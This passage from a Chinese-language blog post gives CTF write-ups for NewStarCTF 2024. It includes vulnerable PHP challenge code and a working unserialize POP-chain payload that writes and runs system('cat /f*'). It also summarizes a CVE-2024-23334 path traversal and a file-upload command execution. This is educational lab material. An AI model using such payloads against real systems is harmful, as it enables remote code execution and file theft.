</span></span><span class="line"><span class="cl">    public $study;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    public function __destruct()
</span></span><span class="line"><span class="cl">    {
</span></span><span class="line"><span class="cl">        if ($this-&gt;study == &#34;happy&#34;) {
</span></span><span class="line"><span class="cl">            echo ($this-&gt;study);
</span></span><span class="line"><span class="cl">        }
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">}
</span></span><span class="line"><span class="cl">class ctf
</span></span><span class="line"><span class="cl">{
</span></span><span class="line"><span class="cl">    public $ctf;
</span></span><span class="line"><span class="cl">    public function __tostring()
</span></span><span class="line"><span class="cl">    {
</span></span><span class="line"><span class="cl">        if ($this-&gt;ctf === &#34;phpinfo&#34;) {
</span></span><span class="line"><span class="cl">            die(&#34;u can&#39;t do this!!!!!!!&#34;);
</span></span><span class="line"><span class="cl">        }
</span></span><span class="line"><span class="cl">        ($this-&gt;ctf)(1);
</span></span><span class="line"><span class="cl">        return &#34;can can need&#34;;
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">}
</span></span><span class="line"><span class="cl">class let_me
</span></span><span class="line"><span class="cl">{
</span></span><span class="line"><span class="cl">    public $let_me;
</span></span><span class="line"><span class="cl">    public $time;
</span></span><span class="line"><span class="cl">    public function get_flag()
</span></span><span class="line"><span class="cl">    {
</span></span><span class="line"><span class="cl">        $runcode=&#34;&lt;?php #&#34;.$this-&gt;let_me.&#34;?&gt;&#34;;
</span></span><span class="line"><span class="cl">        $tmpfile=&#34;code.php&#34;;
</span></span><span class="line"><span class="cl">        try {
</span></span><span class="line"><span class="cl">            file_put_contents($tmpfile,$runcode);
</span></span><span class="line"><span class="cl">            echo (&#34;we need more&#34;.$this-&gt;time);
</span></span><span class="line"><span class="cl">            unlink($tmpfile);
</span></span><span class="line"><span class="cl">        }catch (Exception $e){
</span></span><span class="line"><span class="cl">            return &#34;no!&#34;;
</span></span><span class="line"><span class="cl">        }
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">    public function __destruct(){
</span></span><span class="line"><span class="cl">        echo &#34;study ctf let me happy&#34;;
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">class happy
</span></span><span class="line"><span class="cl">{
</span></span><span class="line"><span class="cl">    public $sign_in;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    public function __wakeup()
</span></span><span class="line"><span class="cl">    {
</span></span><span class="line"><span class="cl">        $str = &#34;sign in &#34;.$this-&gt;sign_in.&#34; here&#34;;
</span></span><span class="line"><span class="cl">        return $str;
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$signin = $_GET[&#39;new_star[ctf&#39;];
</span></span><span class="line"><span class="cl">if ($signin) {
</span></span><span class="line"><span class="cl">    $signin = base64_decode($signin);
</span></span><span class="line"><span class="cl">    unserialize($signin);
</span></span><span class="line"><span class="cl">}else{
</span></span><span class="line"><span class="cl">    echo &#34;ä½ æ˜¯çœŸæ­£çš„CTF New Star å—ï¼Ÿ è®©æˆ‘çœ‹çœ‹ä½ çš„èƒ½åŠ›&#34;;
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><p>åˆ©ç”¨ç‚¹æ—¶get_flagï¼Œä¸è¿‡æˆ‘ä»¬éœ€è¦ç»•è¿‡é‚£ä¸ªunlinkï¼Œä¸ç„¶è®¿é—®code.phpä»ä¼šå¤±è´¥</p>
<p>payloadå¦‚ä¸‹ï¼Œæ³¨é‡Šä¸­æ˜¯å…³é”®ç‚¹</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$a=new happy;
</span></span><span class="line"><span class="cl">$a-&gt;sign_in = new ctf;
</span></span><span class="line"><span class="cl">$b = new let_me;
</span></span><span class="line"><span class="cl">$b-&gt;let_me = &#34;?&gt;&lt;?php system(&#39;cat /f*&#39;);&#34;; //ç”¨? &gt;é—­åˆè¿‡æ»¤#
</span></span><span class="line"><span class="cl">$b-&gt;time = new ctf;
</span></span><span class="line"><span class="cl">$b-&gt;time-&gt;ctf = &#34;phpinfo&#34;; //è§¦å‘ctfç±»ä¸­çš„dieæå‰ç»ˆæ­¢ç¨‹åºä½¿ unlinkæ— æ•ˆ
</span></span><span class="line"><span class="cl">$a-&gt;sign_in-&gt;ctf = array($b,&#34;get_flag&#34;); //é€šè¿‡æ•°ç»„è°ƒç”¨let_meä¸­çš„get_flag()
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">echo base64_encode(serialize($a));
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/newstarctf2024/image-20250708161848116.png"
	width="1679"
	height="562"
	srcset="/p/newstarctf2024/image-20250708161848116_hu12160712057499911407.png 480w, /p/newstarctf2024/image-20250708161848116_hu9160818742035466469.png 1024w"
	loading="lazy"
	
		alt="image-20250708161848116"
	
	
		class="gallery-image" 
		data-flex-grow="298"
		data-flex-basis="717px"
	
></p>
<p>æ‰“å®Œè®¿é—®code.php</p>
<p><img src="/p/newstarctf2024/image-20250708161902880.png"
	width="653"
	height="175"
	srcset="/p/newstarctf2024/image-20250708161902880_hu5768845937225157419.png 480w, /p/newstarctf2024/image-20250708161902880_hu12321066371086012596.png 1024w"
	loading="lazy"
	
		alt="image-20250708161902880"
	
	
		class="gallery-image" 
		data-flex-grow="373"
		data-flex-basis="895px"
	
></p>
<h3 id="è‡­çš®çš„ç½‘ç«™">è‡­çš®çš„ç½‘ç«™
</h3><h4 id="çŸ¥è¯†ç‚¹cve-2024-23334ä»£ç å®¡è®¡">çŸ¥è¯†ç‚¹ï¼šCVE-2024-23334ã€ä»£ç å®¡è®¡
</h4><p>ä¹‹å‰å†™çš„çš„æ²¡ä¿å­˜ï¼Œåªå‰©å›¾ç‰‡äº†ï¼Œè®²ç©¶è®²ä¸€ä¸‹</p>
<p>CVE-2024-23334ï¼Œç›´æ¥è¯»å–æºç </p>
<p><img src="/p/newstarctf2024/image-20250709155006477.png"
	width="1925"
	height="633"
	srcset="/p/newstarctf2024/image-20250709155006477_hu14430564974677198795.png 480w, /p/newstarctf2024/image-20250709155006477_hu11655778754281747288.png 1024w"
	loading="lazy"
	
		alt="image-20250709155006477"
	
	
		class="gallery-image" 
		data-flex-grow="304"
		data-flex-basis="729px"
	
></p>
<p><img src="/p/newstarctf2024/image-20250709155051199.png"
	width="1898"
	height="678"
	srcset="/p/newstarctf2024/image-20250709155051199_hu4856475107322073361.png 480w, /p/newstarctf2024/image-20250709155051199_hu4963730718257453259.png 1024w"
	loading="lazy"
	
		alt="image-20250709155051199"
	
	
		class="gallery-image" 
		data-flex-grow="279"
		data-flex-basis="671px"
	
></p>
<p>å®¡è®¡ä¸€ä¸‹å‘ç°adminçš„è´¦å·å¯†ç æ˜¯é€šè¿‡éšæœºæ•°ç”Ÿæˆçš„ï¼Œä½†æ˜¯éšæœºç§å­æ˜¯å›ºå®šçš„ï¼Œæ˜¯macåœ°å€ï¼Œæˆ‘ä»¬è¯»ä¸€ä¸‹macåœ°å€</p>
<p><img src="/p/newstarctf2024/image-20250709161446499.png"
	width="1631"
	height="411"
	srcset="/p/newstarctf2024/image-20250709161446499_hu16505977455385261240.png 480w, /p/newstarctf2024/image-20250709161446499_hu7395537271670417666.png 1024w"
	loading="lazy"
	
		alt="image-20250709161446499"
	
	
		class="gallery-image" 
		data-flex-grow="396"
		data-flex-basis="952px"
	
></p>
<p>ç„¶åå†™ä»£ç æŠŠå¯†ç è·‘å‡ºæ¥</p>
<p><img src="/p/newstarctf2024/image-20250709162618911.png"
	width="1535"
	height="894"
	srcset="/p/newstarctf2024/image-20250709162618911_hu2061494321948493581.png 480w, /p/newstarctf2024/image-20250709162618911_hu14815742543154925252.png 1024w"
	loading="lazy"
	
		alt="image-20250709162618911"
	
	
		class="gallery-image" 
		data-flex-grow="171"
		data-flex-basis="412px"
	
></p>
<p>ç™»å½•æˆåŠŸ</p>
<p><img src="/p/newstarctf2024/image-20250709162711258.png"
	width="838"
	height="557"
	srcset="/p/newstarctf2024/image-20250709162711258_hu11820155577958461829.png 480w, /p/newstarctf2024/image-20250709162711258_hu13636897233400814113.png 1024w"
	loading="lazy"
	
		alt="image-20250709162711258"
	
	
		class="gallery-image" 
		data-flex-grow="150"
		data-flex-basis="361px"
	
></p>
<p>æ–‡ä»¶ä¸Šä¼ ä¼ ä¸€ä¸ªlsæ–‡ä»¶ï¼Œæ³¨æ„æ–‡ä»¶åå’Œå†…å®¹</p>
<p><img src="/p/newstarctf2024/image-20250709163102547.png"
	width="1021"
	height="679"
	srcset="/p/newstarctf2024/image-20250709163102547_hu9663171408448960224.png 480w, /p/newstarctf2024/image-20250709163102547_hu12406327076270389562.png 1024w"
	loading="lazy"
	
		alt="image-20250709163102547"
	
	
		class="gallery-image" 
		data-flex-grow="150"
		data-flex-basis="360px"
	
></p>
<p>è®¿é—®ï¼Œè·å–flagæ–‡ä»¶å</p>
<p><img src="/p/newstarctf2024/image-20250709163116984.png"
	width="913"
	height="193"
	srcset="/p/newstarctf2024/image-20250709163116984_hu7537999415132232141.png 480w, /p/newstarctf2024/image-20250709163116984_hu10543109966375521264.png 1024w"
	loading="lazy"
	
		alt="image-20250709163116984"
	
	
		class="gallery-image" 
		data-flex-grow="473"
		data-flex-basis="1135px"
	
></p>
<p>ç„¶åå¯ä»¥ç›´æ¥å†è¯»å–äº†</p>
<p><img src="/p/newstarctf2024/image-20250709163234307.png"
	width="1833"
	height="519"
	srcset="/p/newstarctf2024/image-20250709163234307_hu4835101552188794663.png 480w, /p/newstarctf2024/image-20250709163234307_hu15391972988879425945.png 1024w"
	loading="lazy"
	
		alt="image-20250709163234307"
	
	
		class="gallery-image" 
		data-flex-grow="353"
		data-flex-basis="847px"
	
></p>
<h3 id="sqlshell">sqlshell
</h3><h4 id="çŸ¥è¯†ç‚¹sqlå†™é©¬">çŸ¥è¯†ç‚¹ï¼šsqlå†™é©¬
</h4><p>æœ€è®¨åŒsqlï¼Œå®˜æ–¹expè·‘ä¸å‡ºï¼Œè¿™é‡Œæ”¾ä¸€æ”¾</p>
<h2 id="å°ç»“">å°ç»“
</h2><p>newstaræ€»ä½“æ¥è¯´è´¨é‡è¿˜æ˜¯å¾ˆé«˜çš„ï¼Œä½†æ˜¯å¾ˆå¤šé¢˜ç›®éƒ½æ˜¯è‡ªå·±ç›´æ¥çœ‹wpå¤ç°çš„ï¼Œæ‰€ä»¥æˆå°±æ„Ÿä¸é«˜ï¼Œä¸è¿‡ä¹Ÿé¢‡æœ‰æ”¶è·ã€‚</p>

</section>


    <footer class="article-footer">
    

    </footer>


    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">ç›¸å…³æ–‡ç« </h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="">
    <a href="/p/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982025/">
        
        

        <div class="article-details">
            <h2 class="article-title">æå®¢å¤§æŒ‘æˆ˜2025</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/">
        
        

        <div class="article-details">
            <h2 class="article-title">cyberstrikelabæ¸—é€å¤ç°</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/">
        
        

        <div class="article-details">
            <h2 class="article-title">æ˜¥ç§‹äº‘é•œæ¸—é€å¤ç°</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/2025%E6%B1%9F%E8%A5%BF%E4%BF%A1%E6%81%AF%E6%8A%80%E6%9C%AF%E7%9C%81%E8%B5%9B%E5%86%B3%E8%B5%9B/">
        
        

        <div class="article-details">
            <h2 class="article-title">2025æ±Ÿè¥¿ä¿¡æ¯æŠ€æœ¯çœèµ›å†³èµ›</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/qctf2025/">
        
        

        <div class="article-details">
            <h2 class="article-title">qctf2025</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    <div class="disqus-container">
    <div id="disqus_thread"></div>
<script>
    window.disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</div>

<style>
    .disqus-container {
        background-color: var(--card-background);
        border-radius: var(--card-border-radius);
        box-shadow: var(--shadow-l1);
        padding: var(--card-padding);
    }
</style>

<script>
    window.addEventListener('onColorSchemeChange', (e) => {
        if (typeof DISQUS == 'object') {
            DISQUS.reset({
                reload: true
            });
        }
    })
</script>

    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2025 - 
        
        2026 liernian
    </section>
    
    <section class="powerby">
        ä½¿ç”¨ <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> æ„å»º <br />
        ä¸»é¢˜ <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> ç”± <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> è®¾è®¡
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.59729e8016d63fb571847b33800c7f0e48c9acdb8eaed3eec3e94d3bcad55aca.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
